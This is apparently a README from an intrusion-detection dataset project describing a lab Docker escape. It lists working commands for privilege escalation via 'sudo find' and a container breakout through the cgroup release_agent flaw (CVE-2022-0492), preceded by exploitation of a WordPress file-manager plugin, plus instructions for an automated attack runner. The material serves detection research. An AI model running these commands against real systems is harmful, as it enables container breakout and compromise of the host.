# **Docker Escape**

## **Table of Contents**
* [Explaining the attack](#explaining-the-attack)
* [How to Use](#how-to-use)
  * [Configurations](#configuration)
  * [Repeat mode](#for-repeat-mode)
* [Troubleshooting](#troubleshooting)
  * [Docker Escape attack fails on the reverse shell phase](#docker-escape-attack-fails-on-the-reverse-shell-phase)

## **Explaining the attack**
---

<br/>

Docker containers are well known, documented and simple to get started with, however we need to keep in mind the way they are used and especially the permissions these containers have.

This attack simulates the situation where a web server is running inside a Docker container, used for purposes of isolation, where the developer gave the container the ability to use the mount command.

This can be achieved by adding a capability to the container which has the mount command and disabling the apparmor, since it contains a black list for capabilities. This situation can also be achieved by executing the container with the [--privileged](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) flag.

In our case we went with:

```
cap_add:
    - SYS_ADMIN
security_opt:
    - apparmor:unconfined
```

`cap_add` will add the SYS_ADMIN capability which will give the container the ability to execute mount.

`security_opt:` will disable the default docker apparmor profile allowing us to use the mount command.

<br/>

After getting access to the system with the Wp File Manager vulnerability ([CVE-2020-25213](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213)) we need to get root permissions within the container in order to break the isolation, for that we simulated a misconfiguration where the www-data user is able to use only one command with sudo which is `sudo find`.

The attack is as follows:

* Gain initial access through the Wp File Manager vulnerability.
* Execute `sudo find . -exec /bin/sh \; -quit ` which will spawn a root shell
* Exploit Linux Kernel's cgroup_release_agent vulnerability ([CVE-2022-0492](https://nvd.nist.gov/vuln/detail/cve-2022-0492)) by executing the following commands:
  * `mkdir /tmp/cgroup_mount`
  * `mount -t cgroup -o rdma cgroup /tmp/cgroup_mount/`
  * `mkdir /tmp/cgroup_mount/test`
  * `echo 1 > /tmp/cgroup_mount/test/notify_on_release`
  * `dir=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)`
  * `echo $dir"/escapingDocker" >  /tmp/cgroup_mount/release_agent`
  * `echo '#!/bin/sh' > /escapingDocker`
  * `echo 'ps aux >> '$dir'/output' >> /escapingDocker`
  * `echo 'echo "PoC, injected through the container" > /File_on_Host' >> /escapingDocker`
  * `chmod a+x /escapingDocker`
  * `sh -c "echo \$$ > /tmp/cgroup_mount/test/cgroup.procs`

<br/>

This script will execute `ps aux` on the host and write the output in a file inside docker `/output` to show that we can execute code in the host and be able to read the result.
After that, it will create a file `/File_on_Host` with the content `PoC, injected through the container` so that the user can swiftly check by himself that the attack was successful.

<br/>

## **How to use**
---
<br/>

This exploit can be ran in **repeat** mode.

From the **/path/to/project/IDS-Dataset/Attacks/WP** folder,

<br/>

### **Configurations:**

If you built the victim machine from scratch using our script you can use the following settings for the Docker escape attack:

``` Shell
sudo python3 main.py -c # To start the configuration process

Attacker ip: # Check the ip address with ' ifconfig '
Victim ip: # Check the ip address with ' ifconfig '
Exploit: 3
HTTPS: n
Victim Port: 8080
Activate auditing: y # Make sure the server is on, check Aux README for information
```

<br/>


### **For Repeat mode:**
``` Shell
sudo python3 main.py -r {number_times} # Don't forget to configure the config.ini on the 1st attack
```

OR

``` Shell
sudo python3 main.py # Don't forget to configure the config.ini on the 1st attack
```

This will execute the commands mentioned [above](#explaining-the-attack).

<br/>

## **Troubleshooting**
---

### **_Docker Escape attack fails on the reverse shell phase_:**
At the end of the setup process of the victim machine you will be instructed to execute some steps in order finish setting up what wasn't possible through the script. In you modified the Docker machine, or had to re-build it you might want to re-run through this steps:

* Access http://localhost:8080 and follow the installation steps
* Access the Plugins tab and Activate the Wp File Manager plugin
* Execute in the terminal -> ```shell docker exec $(docker ps | grep docker_wordpress | awk '{ print $1 }') bash -c "chown -R www-data:www-data /var/www/html/wp-content/"```


This will setup the Docker machine to be in the exact same state it was during development.
